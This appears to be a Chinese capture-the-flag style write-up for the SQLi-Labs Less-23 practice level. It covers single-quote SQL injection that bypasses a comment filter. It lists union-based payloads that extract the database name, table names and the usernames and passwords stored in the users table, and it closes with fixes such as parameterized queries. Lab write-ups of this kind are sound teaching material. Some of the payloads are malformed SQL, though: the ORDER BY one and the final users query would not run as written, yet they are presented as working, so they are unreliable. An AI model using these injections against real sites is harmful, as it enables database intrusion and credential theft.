# SQLi-Labs | Less-23 GET 单引号 过滤注释符 联合注入
## 一、漏洞简介
GET型注入，参数id单引号闭合，本关卡过滤了 `--+`、`#` 注释符，不能用常规注释方式，需要利用SQL语句构造，闭合后面剩余语句，使用union联合查询脱库。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-23/?id=1
注入类型：GET、字符型、单引号闭合、过滤注释符、联合注入
## 三、复现步骤
1. 访问 ?id=1' 页面报错，确认单引号闭合。
2. 测试注释：`?id=1' --+` 和 `?id=1' #` 失效，判断注释被过滤。
3. 思路：不注释，用 `and '1'='1` 闭合后面的单引号，使SQL语法合法。
4. order by判断列数为3列，然后构造union联合查询。
## 四、Payload
判断列数：
`?id=1' and order by 3 and '1'='1`
找回显位置：
`?id=-1' union select 1,2,3 and '1'='1`
查库名：
`?id=-1' union select 1,version(),database() and '1'='1`
查表：
`?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and '1'='1`
查users数据：
`?id=-1' union select 1,username,password from users and '1'='1`
## 五、漏洞原理
后端SQL：
`SELECT * FROM users WHERE id='$id' LIMIT 0,1`
过滤了注释符，但没有过滤and、union等关键字，攻击者使用 `and '1'='1` 巧妙闭合末尾的单引号，保证SQL语法正常执行，实现注入。
## 六、修复方案
1. 预编译参数化查询，从根源杜绝注入。
2. 不要只过滤注释符，注释绕过方式很多，过滤关键字是弱防护。
3. 输入白名单校验，id只允许数字。
## 七、总结
Less23重点考察注释符被过滤后的绕过思路，不再依赖--+注释，利用等式闭合字符串，是常见的过滤绕过入门关卡。